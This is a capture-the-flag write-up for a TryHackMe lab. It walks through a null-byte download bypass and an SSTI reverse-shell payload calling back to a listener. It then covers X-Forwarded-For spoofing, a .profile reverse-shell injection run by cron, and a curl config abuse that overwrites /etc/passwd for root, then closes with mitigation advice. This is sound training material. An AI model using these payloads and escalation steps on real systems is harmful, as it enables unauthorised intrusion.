# TryHackMe: Super Secret TIp

## Challenge Description

Well, Well, Well, you're here, and I am glad to see that! Your task is simple.. well, not really.. I mean, it's kind of.. but.. anyways...
I was debugging my work and forgot about some probably harmful code, and sadly, I lost access to my machine. :(

Could you find my valuable information for me?
Don't forget to enjoy the journey while at it.

## Planning and Scoping

The analysis begins with two prominent IP addresses in the narrative - the local machine at `10.10.172.173` and the target machine at `10.10.160.112`.

## Information Gathering and Reconnaissance

A `nmap` scan unveils two open ports – 22, associated with SSH, and 7777, associated with a Python application running on Werkzeug. 

```bash
nmap -sC -sV 10.10.160.112
```

Results:

- 22/tcp: OpenSSH 7.6p1
- 7777/tcp: Werkzeug/2.3.4 Python/3.11.0

A `gobuster` scan sheds light on two directories - `/cloud` and `/debug`.

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.160.112:7777
..
/cloud (Status: 200)
/debug (Status: 200)
```

---

### Source Code Retrieval Using Burp Suite

Intercept the download request in Burp Suite to directly retrieve the source code file. Werkzeug main scripts are typically named `source.py` or `app.py`.

```plaintext
POST /cloud HTTP/1.1
Host: 10.10.210.50:7777
...
download=source.py
```

```python
source.py:
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

---

### Bypassing File Type Restriction

By reading the source code, we see that we can download any file that ends with `.txt`. We can use a null byte to bypass that check in the cloud download route:

```plaintext
POST /cloud HTTP/1.1
Host: 10.10.210.50:7777
...
download=supersecrettip.txt
download=ip.py%00.txt
download=debugpassword.py%00.txt
```

Contents of `supersecrettip.txt`:
```python
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

Contents of `ip.py`:
```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

Contents of `debugpassword.py`:
```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

### Decrypting the Password for /debug and Exploiting SSTI

We can decrypt the password needed for the `/debug` route by creating a `get_encrypted` script which reverses the `debugpassword.py` file. By calling this function and passing the encrypted password, we can unveil the actual password.

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')

# Space is necessary
print(get_encrypted(' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'))
```

Executing this code snippet will print the password `'AyhamDeebugg'`.

Furthermore, we can exploit Server-Side Template Injection (SSTI) to gain a reverse shell. Here's the SSTI payload that takes advantage of the Flask environment to execute system commands:

```python
{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.10.225.87/5000 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
```

Ensure to replace `10.10.225.87/5000` with your listener's IP address and port to receive the reverse shell.

### Executing the Payload via /debugresult

Now, with the decrypted password and the SSTI payload ready, we can execute it by navigating to the `/debugresult` route. However, there's an IP check in place, as seen in the `ip.py` file.

But by examining the `ip.py`, we find a bypass. We can spoof the IP check by adding the `X-Forwarded-For: 127.0.0.1` header to our request, tricking the application into thinking that the request is coming from the allowed IP address.

Once the IP check is bypassed, the payload will be executed, and we need to be ready to receive the reverse shell. On the attacker's machine, listen on port 5000, or whichever port was specified in the SSTI payload:

```shell
nc -lvnp 5000
```

Once everything is set and the payload is executed, we should receive a shell prompt similar to the following:

```shell
ayham@482cbf2305ae:/app$
```

Now, we have gained a shell on the target machine and can proceed with further exploitation or exploration.

---

### Elevating Privileges via Crontab and .profile

Having obtained a shell, we explore the `crontab` and discover the following scheduled tasks:

```shell
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

Upon further investigation, we notice that `/home/F30s/.profile` is writable. This allows us to inject a reverse shell command into `.profile`, which gets executed due to the `bash -lc 'cat /home/F30s/health_check'` task in the crontab.

We append a reverse shell command to `.profile`:

```shell
echo "bash -i >& /dev/tcp/10.10.225.87/4444 0>&1" >> /home/F30s/.profile
```

We need to replace `10.10.225.87/4444` with our own listening IP address and port. On our host machine, we initiate a listener on port 4444 to catch the incoming reverse shell:

```shell
nc -lvnp 4444
```

We then patiently wait for the crontab job to trigger the `.profile`. Once it’s executed, we receive a new elevated shell as the `F30s` user:

```shell
F30s@482cbf2305ae:~$
```

With elevated privileges in our grasp, we are now in a position to delve deeper into the system, escalating our access or exploring for sensitive data.

### Gaining Root Access via Curl Config Manipulation

We take another look at the cronjob we identified earlier and pay special attention to this job:

```shell
*  *    * * *   root    curl -K /home/F30s/site_check
```

We have write permissions to the `/home/F30s/site_check` file, and since this file is used as a config for the curl command (indicated by the -K option in the cronjob), we see an opportunity.

The permissions of the file are:

```shell
F30s@482cbf2305ae:~$ ls -all /home/F30s/site_check
-rw-r----- 1 F30s F30s 129 Sep 28 20:39 /home/F30s/site_check
```

Given that the curl config is executed by root, and we can edit it, we essentially have the ability to write to any file on the system. We decide to exploit this to add a new user with root permissions directly into the `/etc/passwd` file.

We create a password hash using openssl:

```shell
F30s@482cbf2305ae:~$ echo hacker:`openssl passwd -1 -salt asdf password1`:0:0:root:/root:/bin/bash
hacker:$1$asdf$If00rGpofpPSEO0asfmyq/:0:0:root:/root:/bin/bash
```

We prepare a new `/etc/passwd` file, named `etcpasswd`, which includes our new user:

```shell
F30s@482cbf2305ae:~$ cat etcpasswd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ... (other users)
F30s:x:1001:1001::/home/F30s:/bin/bash
hacker:$1$asdf$If00rGpofpPSEO0asfmyq/:0:0:root:/root:/bin/bash
```

Now, we adjust the `site_check` curl config file to fetch and overwrite `/etc/passwd` with our crafted version:

```shell
F30s@482cbf2305ae:~$ cat site_check
url = "http://127.0.0.1/etcpasswd"
output = "/etc/passwd"
stderr = "/tmp/etc-error.log"
```

We host the `etcpasswd` file using a simple HTTP server and wait for the cronjob to pull the file and overwrite `/etc/passwd`:

```shell
F30s@482cbf2305ae:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [28/Sep/2023 20:40:01] "GET /etcpasswd HTTP/1.1" 200 -
```

The cronjob executes, overwriting `/etc/passwd` with our crafted version. Now, we switch to our new hacker user:

```shell
F30s@482cbf2305ae:~$ su hacker
Password: asdf
```

We’re now root:

```shell
root@482cbf2305ae:/#
```

With this level of access, we have full control of the system, opening the door to a myriad of possibilities for exploration and exploitation.

### Decoding the Flag

After a successful root penetration, we ventured further into the depths of the machine. Inside the `/root` directory, two mysterious files named `flag2.txt` and `secret.txt` caught our eyes. A quick examination revealed encrypted contents. It was now our task to unveil the enigma cloaked within.

```shell
root@482cbf2305ae:/root# ls
flag2.txt  secret.txt
```

We were eager to discern their contents.

```shell
root@482cbf2305ae:/root# cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'

root@482cbf2305ae:/root# cat secret.txt
b'C^_M@__DC\\7,'
```

The presence of these encrypted files triggered our cryptanalytic instincts. Our previous explorations informed us about an XOR cipher; thus, we crafted `xor_secret.py` to employ this mechanism and decrypt `secret.txt`, potentially unearthing a key to unlock `flag2.txt`.

```shell
root@482cbf2305ae:/root# vim xor_secret.py
```

We initiated the decryption process, curious to unravel the enigmatic `secret.txt` using xor_secrey.py.

```python
import pwn

# Text from /secret-tip.txt as a guess for decryption
secret_tip = """
A wise *gpt* once said ...
In the depths of a hidden vault, the mastermind discovered that vital elements of their secret algorithm had vanished without a trace. They knew their cryptographic integrity was now vulnerable to disruption, setting in motion a desperate race against time to recover the missing components before their security infrastructure unraveled before their eyes.
So, I was missing 2 .. hmm .. what were they called? ... I actually forgot, anyways I need to remember them, they're important. The past/back/before/not after actually matters, follow it!
Don't forget it's always about root!
"""

# Removing punctuations and splitting words
words = ''.join(c if c.isalnum() or c.isspace() else ' ' for c in secret_tip).split()

cipher = b'C^_M@__DC\\7,'  # The cipher from secret.txt

# Test each word as key
for word in words:
    key = word.encode()
    result = pwn.xor(cipher, key)
    print(f"Key: {word}, Result: {result}")
```

```shell
root@482cbf2305ae:/root# python3 xor_secret.py
...
Key: always, Result: b'"2(,9,>(4=N_'
Key: about, Result: b'"<084>=+6(VN'
Key: root, Result: b'1109200013XX'
```

"root" produced a compelling sequence, albeit incomplete, evoking our relentless pursuit of the complete key. We hypothesized that a brute force mechanism to unmask the hidden characters would lead us to triumph. We improvised a decryption script, `decrypt.py`.

```python
import pwn
import string

encrypted_flag = b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
base_key = b'1109200013'
characters = string.digits

for c1 in characters:
    for c2 in characters:
        key = base_key + c1.encode() + c2.encode()
        decrypted_flag = pwn.xor(encrypted_flag, key).decode(errors='ignore')
        if decrypted_flag.isprintable():
            print(f"Key: {key}, Decrypted Flag: {decrypted_flag}")
```

We executed the decryption script and identified a specific flag.

```shell
root@482cbf2305ae:/root# python3 decrypt.py | grep cronjobs
THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

We received numerous results, but the one beginning with "cronjobs" appeared to be the most coherent and logical.

## Recommendations

### Mitigating Risks

1. **Source Code Exposure**: Avoid exposing sensitive directories and ensure rigorous access controls to prevent unauthorized access to source code.
2. **Input Validation**: Strengthen input validation to guard against potential injection attacks or unauthorized file access.
3. **Cronjobs and File Permissions**: Ensure proper permissions are set for files and scripts referenced in cronjobs to prevent malicious modifications.

### Strengthening Security

1. **Update and Patch**: Regularly update the software to patch known vulnerabilities.
2. **Access Controls**: Implement stringent access controls and permissions, ensuring that only authorized personnel can access and modify sensitive files.
3. **Monitoring and Auditing**: Enable comprehensive logging and monitoring to detect any anomalous or unauthorized activities promptly.

By following these recommendations, the security of the system can be significantly enhanced, minimizing the risks associated with potential exploitations of the identified vulnerabilities.